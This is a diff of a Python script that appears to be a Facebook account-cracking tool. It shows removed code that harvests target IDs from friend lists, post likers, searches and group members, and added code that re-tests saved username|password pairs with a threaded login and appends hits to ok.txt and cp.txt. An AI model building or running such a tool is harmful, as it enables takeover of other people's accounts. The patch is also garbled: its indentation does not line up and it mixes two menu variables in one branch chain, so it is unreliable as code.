@@ -234,29 +234,31 @@ def moch_yayan():
                          os.system("rm -rf cookies")
                          print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                          yayanxd()
-                   elif memek == '1' or memek =='01':
-                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
-                         username = getid(mbasic.format(url["href"]))
-                   elif memek == '2' or memek =='02':
-                         username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
-                         if username == "":
-                                 exit("\033[00m[\033[91m!\033[00m] Cannot be empty!")
-                         elif 'www.facebook' in username:
-                                 username = username.replace('www.facebook','mbasic.facebook')
-                         elif 'www.facebook' in username:
-                                 username = username.replace('m.facebook','mbasic.facebook.com')
-                         username = fromlikes(username)
-                   elif memek == '3' or memek =='03':
-                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] CARI NAMA TEMAN\033[1;91m: \033[1;92m")
-                         username = bysearch(mbasic.format('/search/people/?q='+knf))
-                         if len(username) == 0:
-                                 exit("\033[90m[\033[91m!\033[90m] No Name!")
-                   elif memek == '4' or memek =='04':
-                         print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
-                         grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
-                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
-                         if len(username) == 0:
-                                 exit("\033[00m[\033[91m!\033[00m] Group ID None!")
+                   elif ask == "1" or ask == "01":
+                try:
+                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
+                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;92m\n"%(ha, op, ta,M,H,len(totalok)))
+                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
+                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    moch_yayan()
+                except (IOError):
+                    print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil ok :(")
+                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
+                    moch_yayan()
+            elif ask == "2" or ask == "02":
+                try:
+                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
+                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;93m\n"%(ha, op, ta,M,K,len(totalcp)))
+                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
+                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
+                    moch_yayan()
+                except (IOError):
+                    print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil cp :(")
+                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
+                    moch_yayan()
                    elif memek == '5' or memek =='05':
                          knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                          if knf.isdigit():
@@ -269,13 +271,23 @@ def moch_yayan():
                          except TypeError:
                                  exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
                    elif memek == '6' or memek =='06':
-                              try:
-                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;93m\n"%(ha, op, ta,M,K,len(totalcp)))
-                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
-                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-                    raw_input('\n  [ %sKEMBALI%s ] '%())
+                         try:
+                                 file1 = open("cp.txt").read()
+                                 file2 = open("ok.txt").read()
+                                 a = file1 + file2
+                                 final = a.strip().split("\n")
+                                 final = set(final)
+                                 print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] untuk memeriksa akun")
+                                 with ThreadPoolExecutor(max_workers=10) as ex:
+                                         for user in final:
+                                                 a = user.split("|")
+                                                 ex.submit(login,(a[0]),(a[1]),(True))
+                                 for x in result:
+                                         with open('ok.txt','a') as f:
+                                                 f.write(x+'\n')
+                                 for x in chek:
+                                         with open('cp.txt','a') as f:
+                                                 f.write(x+"\n")
 
                                  print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] crack selesai....")
                                  print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] simpan \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
